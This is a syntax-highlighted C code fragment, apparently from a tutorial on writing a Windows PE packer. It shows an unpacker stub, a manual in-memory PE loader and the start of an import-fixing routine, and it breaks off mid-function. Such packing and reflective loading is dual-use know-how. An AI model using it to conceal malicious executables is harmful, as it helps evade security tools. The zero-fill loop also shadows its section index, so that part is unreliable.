&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_DOS_header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">unpacker_VA&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(((&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">unpacker_VA&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_DOS_header&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">e_lfanew&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">packed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="n">packed_section_name&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;.packed&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">mystrcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">packed_section_name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">packed&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unpacker_VA&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">packed&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">entrypoint&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="n">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">packed&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">entrypoint&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">load_PE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_DOS_header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_DOS_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">PE_data&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p_DOS_header&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">e_lfanew&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// extract information from PE header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_image&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfImage&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfEntryPoint&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">size_of_headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// allocate memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">VirtualAlloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_image&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MEM_RESERVE&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">MEM_COMMIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// copy PE headers in memory
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">mymemcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_of_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Section headers starts right after the IMAGE_NT_HEADERS struct, so we do some pointer arithmetic-fu here.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">sections&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_SECTION_HEADER&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_NT_headers&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// calculate the VA we need to copy the content, from the RVA
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// section[i].VirtualAddress is a RVA, mind it
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// check if there is Raw data to copy
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// We copy SizeOfRaw data bytes, from the offset PointerToRawData in the file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">mymemcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PE_data&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">PointerToRawData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">SizeOfRawData&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">dest&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">fix_iat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">fix_base_reloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// Set permission for the PE header to read only
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">oldProtect&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">SizeOfHeaders&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READONLY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">FileHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NumberOfSections&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dest&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">s_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Characteristics&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// flags are not the same between virtal protect and the section header
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_EXECUTE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_EXECUTE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_EXECUTE_READ&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">v_perm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s_perm&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_SCN_MEM_WRITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nl">PAGE_READWRITE&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">PAGE_READONLY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">VirtualProtect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dest&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sections&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Misc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">VirtualSize&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v_perm&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">oldProtect&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">entry_point_RVA&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">fix_iat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_image_base&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">IMAGE_NT_HEADERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p_NT_headers&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">IMAGE_DATA_DIRECTORY&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">data_directory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_NT_headers&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">OptionalHeader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DataDirectory&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// load the address of the import descriptors array
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">import_descriptors&lt;/span> &lt;span class="o">=&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_IMPORT_DESCRIPTOR&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">data_directory&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">VirtualAddress&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// this array is null terminated
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">OriginalFirstThunk&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get the name of the dll, and import it
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">module_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">HMODULE&lt;/span> &lt;span class="n">import_module&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadLibraryA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">module_name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// panic!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">ExitProcess&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">255&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// the lookup table points to function names or ordinals =&amp;gt; it is the IDT
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lookup_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">OriginalFirstThunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// the address table is a copy of the lookup table at first
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// but we put the addresses of the loaded function inside =&amp;gt; that&amp;#39;s the IAT
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">address_table&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_THUNK_DATA&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">import_descriptors&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">FirstThunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// null terminated array, again
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">lookup_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfData&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Check the lookup table for the adresse of the function name to import
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">lookup_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">lookup_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">u1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">AddressOfData&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">lookup_addr&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">IMAGE_ORDINAL_FLAG&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// if first bit is not 1
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// import by name : get the IMAGE_IMPORT_BY_NAME struct
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">IMAGE_IMPORT_BY_NAME&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">image_import&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IMAGE_IMPORT_BY_NAME&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">p_image_base&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">lookup_addr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// this struct points to the ASCII function name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">funct_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">image_import&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// get that function address from it&amp;#39;s module and name
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">funct_name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// import by ordinal, directly
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">function_handle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">import_module&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">LPSTR&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">lookup_addr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">function_handle&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
